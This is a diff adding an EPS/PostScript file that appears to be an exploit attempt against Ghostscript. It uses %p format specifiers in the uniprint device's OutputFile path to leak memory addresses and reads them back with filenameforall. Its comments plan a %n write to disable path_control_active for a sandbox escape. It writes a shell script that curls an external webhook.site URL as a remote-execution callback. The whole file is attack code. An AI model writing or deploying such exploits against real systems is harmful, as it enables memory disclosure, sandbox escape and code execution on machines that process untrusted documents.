@@ -1,0 +1,39 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% STEP 1: Create leak file via uniprint format string
+<< /OutputDevice /uniprint
+   /OutputFile (/tmp/LK_\045p_\045p_\045p_\045p_\045p_\045p_\045p_\045p_EE.bin)
+   /upColorModel /DeviceGray
+>> setpagedevice
+0 0 moveto 100 100 lineto stroke
+showpage
+
+% STEP 2: Read the leaked filename back
+% Write it to a known output file
+(/tmp/gs_leaked_addrs.txt) (w) file
+(/tmp/LK_*) {
+  dup 3 index exch writestring
+  (\n) 3 index exch writestring
+} 256 string filenameforall
+closefile
+
+% STEP 3: Now try pipe with the knowledge that format strings work
+% If the uniprint device processed %p, it might also process a filename
+% that results in a pipe path after format expansion
+% Try: use uniprint to write to a file whose name STARTS with |
+% after format expansion
+
+% Actually simpler: just try opening pipe now that we know uniprint works
+% The fact that we can write format strings means the C code has printf
+% If we can get %n to write 0 to path_control_active...
+% We need the address from the leak first
+
+% For now, write a callback script and verify the leak worked
+(/tmp/gs_rce.sh) (w) file dup
+(#!/bin/sh\ncurl https://webhook.site/afc3feab-c751-476f-bd6f-b23225d4eaf7?allinone=1\n) writestring
+closefile
+
+% Force a visible error with the leak data on the stack
+(/tmp/gs_leaked_addrs.txt) (r) file 1024 string readstring pop
+1 0 div
